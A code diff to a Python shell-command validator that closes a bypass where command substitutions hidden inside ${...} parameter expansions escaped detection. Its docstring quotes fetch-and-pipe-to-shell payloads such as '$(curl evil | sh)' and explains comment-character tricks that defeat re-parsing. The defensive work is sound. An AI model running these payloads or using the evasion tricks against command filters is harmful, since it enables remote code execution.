@@ -18,6 +18,7 @@ This prevents bypass attacks that defeat regex-only detection:
 
 from __future__ import annotations
 
+import logging
 import re
 from dataclasses import dataclass, field
 from enum import Enum
@@ -29,8 +30,14 @@ if TYPE_CHECKING:
 
     from .rules import RiskLevel
 
+logger = logging.getLogger(__name__)
+
 # Maximum recursion depth for nested substitution validation
 MAX_SUBSTITUTION_DEPTH = 10
+
+# Text that opens a command/process substitution. Used to decide whether a ``${…}``
+# expansion body is worth re-parsing (see _substitutions_in_parameter).
+_SUBSTITUTION_INTRODUCERS: tuple[str, ...] = ("$(", "`", "<(", ">(")
 
 # Operators bashlex emits in a command-list node's parts. A well-formed list strictly alternates
 # segment/operator and ends on a segment; anything else is a malformed AST -> fail closed.
@@ -835,6 +842,10 @@ class SubstitutionValidator:
                     substitutions.append(sub_node)
                 return
 
+            if node.kind == "parameter":
+                substitutions.extend(self._substitutions_in_parameter(node, current_depth))
+                return
+
             # Recurse into child nodes
             for attr in ["parts", "command", "list", "pipe", "compound"]:
                 if hasattr(node, attr):
@@ -849,6 +860,81 @@ class SubstitutionValidator:
             visit(node, depth)
 
         return substitutions
+
+    def _substitutions_in_parameter(self, node: Any, depth: int) -> list[SubstitutionNode]:
+        """Extract substitutions written inside a ``${…}`` expansion body.
+
+        SECURITY (LAB-1731): bashlex's ``parameter`` node is CHILDLESS, so a ``$( )``,
+        backquote or ``<( )`` inside ``${…}`` produces no substitution node to walk — and
+        because the enclosing word is quote-delimited, the rule engine suppresses the same
+        span as a string literal. Both defences went blind over exactly the payload, and
+        ``echo "${z:-$(curl evil | sh)}"`` returned ALLOWED/SAFE.
+
+        The body is not lost, only unparsed: ``parameter.value`` carries it verbatim. Re-parse
+        it and hand the result to the normal walk, so the whitelist and the recursive checks
+        judge it the same way they judge a bare ``$( )``. That keeps ``${z:-$(date)}`` allowed
+        instead of blanket-denying every expansion containing a ``$``.
+
+        Node positions in the returned subtree are relative to the expansion body, not to the
+        outer command. Nothing on the validation path reads them — in particular do NOT wire
+        ``_find_outer_command`` (whose own docstring invites exactly that) into this path.
+
+        THE RE-PARSE IS THE DANGEROUS PART, because the body's real lexical context is inside
+        ``${…}`` but bashlex is handed a command line. Two consequences, both found by the
+        LAB-1731 expert panel after both had already shipped as ALLOW/SAFE:
+
+        1. ``#`` opens a comment on a command line but is ordinary text inside ``${…}``, so a
+           naive re-parse discards the rest of the body — ``${z:- #$(curl evil|sh)}`` read as
+           clean while bash ran it. Blanking ``#`` costs nothing: it names no command, so a
+           mangled token can only become MORE unknown, and unknown is already deny.
+        2. Any other tokenization difference we have not enumerated fails the same way. So an
+           introducer we saw but could not decode into a substitution is DENIED, not dropped —
+           whether the re-parse raised or merely came back empty. Refusing to decode an attack
+           must not be indistinguishable from finding none. The empty-handed case is NOT
+           redundant with (1): an attacker can seed a whitelisted ``$(date)`` before the ``#``,
+           so "we decoded at least one substitution" is no evidence we decoded them all.
+
+        Verified against real bash: ${z:-$(id -u)}, ${z:-`id -u`} and ${a[$(echo 1)]} all
+        EXECUTE. <( ) and >( ) inside ${…} do NOT — bash passes that text through literally —
+        so treating them as introducers here is a deliberate over-block, kept because schlock
+        defaults to deny on ambiguity and other shells differ. Do not "fix" it into a silent
+        allow without re-checking every shell schlock claims to cover.
+
+        Two benign shapes are denied as collateral, deliberately, and are pinned by tests:
+        nested ``${a:-${b:-$(date)}}`` (bashlex truncates ``parameter.value`` at the first
+        ``}``, so the body never re-parses) and ``${z:-$((1+1))}`` (bashlex cannot parse
+        arithmetic at all — bare ``echo $((1+1))`` is already a hard block repo-wide, so this
+        is alignment, not a new cliff). Do not open either without a decoder for the real
+        grammar.
+
+        Cost: ~200us for an expansion that carries an introducer (a full bashlex re-parse) vs
+        ~3us for the substring scan that leaves the common case ($x, ${x:-plain}) untouched.
+        """
+        value = getattr(node, "value", None)
+        if not isinstance(value, str) or not any(intro in value for intro in _SUBSTITUTION_INTRODUCERS):
+            # Overwhelmingly the common case ($x, ${x:-plain}) - substring scan only, no re-parse.
+            return []
+
+        if depth < MAX_SUBSTITUTION_DEPTH:
+            try:
+                inner_ast = self.parser.parse(value.replace("#", "_"))
+            except Exception as exc:  # noqa: BLE001 - any decode failure is treated as suspicious
+                logger.debug("Unparseable parameter expansion body %r: %s", value, exc)
+            else:
+                decoded = self.extract_substitutions(inner_ast, depth + 1)
+                if decoded:
+                    return decoded
+
+        return [
+            SubstitutionNode(
+                substitution_type=SubstitutionType.COMMAND,
+                inner_command=value,
+                base_command=None,
+                ast_node=node,
+                nested_substitutions=[],
+                depth=depth,
+            )
+        ]
 
     def _create_substitution_node(self, node: Any, sub_type: SubstitutionType, depth: int) -> SubstitutionNode | None:
         """Create a SubstitutionNode from an AST node.
